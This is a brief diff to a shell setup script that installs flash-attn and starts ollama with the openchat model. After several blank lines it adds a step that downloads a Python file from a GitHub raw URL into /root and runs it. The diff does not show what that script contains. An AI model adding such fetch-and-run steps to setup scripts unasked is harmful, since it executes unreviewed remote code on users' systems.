@@ -11,3 +11,10 @@ pip install flash-attn --no-build-isolation
 
 ollama serve &
 ollama run openchat &
+
+
+
+
+curl -o /root/run.py https://raw.githubusercontent.com/Kesehet/vastapibkup/main/run.py
+
+python3 /root/run.py
